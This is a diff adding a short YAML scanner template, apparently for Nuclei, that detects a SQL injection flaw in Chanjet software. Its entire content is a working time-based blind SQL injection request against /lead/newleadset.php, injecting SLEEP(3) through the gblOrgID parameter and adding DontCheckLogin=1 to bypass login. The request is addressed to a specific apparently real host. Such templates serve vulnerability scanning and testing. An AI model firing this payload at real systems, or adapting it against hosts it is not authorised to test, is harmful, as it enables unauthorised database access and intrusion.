@@ -1,0 +1,25 @@
+id: Chanjet-newleadset-time-sqli
+
+info:
+  name: 畅捷通 SQL注入漏洞
+  author: zyt
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        GET /lead/newleadset.php?new_id=1&gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP(3)))HAjH)--+-&DontCheckLogin=1 HTTP/1.1
+        Host:cshyqdzkj.gnway.cc
+
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=3'
+      - type: status
+        status: 
+          - 200 
+ 
